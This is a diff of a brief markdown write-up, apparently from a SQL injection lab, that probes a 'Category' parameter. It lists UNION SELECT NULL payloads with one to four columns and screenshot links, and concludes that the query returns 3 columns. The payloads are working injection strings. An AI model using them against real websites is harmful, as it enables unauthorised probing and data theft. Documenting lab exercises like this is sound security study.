@@ -12,14 +12,21 @@ Category parameter
 
 ## Payload Used
 ' UNION SELECT NULL--
+
 <img width="1918" height="1020" alt="dfdsg" src="https://github.com/user-attachments/assets/af31ab2e-cd34-4639-bfbc-449795f34b0d" />
 
 ' UNION SELECT NULL, NULL--
+
 <img width="1918" height="1020" alt="dfdsg" src="https://github.com/user-attachments/assets/43719b02-3732-4443-9080-5dfa39ba68dc" />
 
 
 ' UNION SELECT NULL, NULL, NULL--
+
 <img width="1917" height="1016" alt="fgddfhdg" src="https://github.com/user-attachments/assets/624f5189-6062-45c6-abc0-e3b6ccf017f9" />
+
+' UNION SELECT NULL, NULL, NULL, NULL--
+
+<img width="1661" height="750" alt="1 5" src="https://github.com/user-attachments/assets/88b2778c-9513-4edf-b3b2-b348c7a581de" />
 
 ## Result
 Identified that the query returns 3 columns.
